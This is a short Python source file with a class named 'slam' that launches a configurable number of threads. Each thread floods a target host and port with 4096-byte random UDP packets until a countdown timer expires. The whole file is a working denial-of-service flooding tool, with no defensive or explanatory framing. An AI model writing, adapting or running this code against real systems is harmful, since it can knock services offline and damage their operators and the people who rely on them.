import socket, threading, random
from time import sleep
from contextlib import suppress

class slam:
    def __init__(self, target, port, threads, time):
        self.target = target
        self.port = port
        self.threads = threads
        self.time = time
        self.run()

    def connect_and_send(self):
        while self.time != 0:
            for i in range(10):
                with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    payload = random._urandom(4096)
                    s.connect((self.target, self.port))
                    s.send(payload)
                    s.close()

    def track_time(self):
        while self.time != 0:
            sleep(1)
            self.time -= 1

    def run(self):
        for i in range(self.threads):
            threading.Thread(target=self.connect_and_send).start()
        if self.time != 0:
            threading.Thread(target=self.track_time).start()
